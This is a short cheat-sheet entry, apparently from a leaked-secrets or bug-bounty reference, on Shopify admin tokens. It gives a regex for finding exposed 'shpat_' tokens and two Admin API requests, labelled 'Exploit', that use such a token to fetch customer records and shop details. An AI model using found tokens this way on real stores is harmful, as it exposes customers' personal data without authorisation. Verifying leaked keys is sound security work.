# Shopify



## Search

```
/shpat_[a-fA-F0-9]{32}/
```

## Exploit

Get customer

```
GET /admin/api/2023-01/customers.json HTTP/2
Host: host.myshopify.com
X-Shopify-Access-Token: shpat_id


```

Get shop details

```
GET /admin/api/2023-01/shop.json HTTP/2
Host: host.myshopify.com
X-Shopify-Access-Token: shpat_id


```
